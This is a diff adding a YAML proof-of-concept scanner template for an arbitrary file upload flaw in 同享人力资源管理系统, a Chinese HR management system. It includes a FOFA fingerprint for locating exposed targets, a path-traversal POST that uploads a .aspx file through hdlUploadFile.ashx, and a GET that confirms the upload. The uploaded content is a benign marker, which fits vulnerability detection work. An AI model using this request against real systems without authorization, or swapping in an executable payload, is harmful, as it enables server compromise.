@@ -1,0 +1,31 @@
+id: poc-yaml-tosharesoft-hdluploadfile-ashx-anyfile-upload
+info:
+  name: 同享人力资源管理系统 hdlUploadFile.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 同享人力资源管理系统
+  fofa: body="/Assistant/Default.aspx"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/{{.t1}}
+  headers:
+    Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+  data: '-----------------------------142851345723692939351758052805
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.t1}}.aspx"
+
+    Content-Type: text/plain
+
+
+    {{.t2}}
+
+    -----------------------------142851345723692939351758052805--'
+  expression: status_code == 200 && contains(body,"/Style")
+- method: GET
+  path: /Style/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
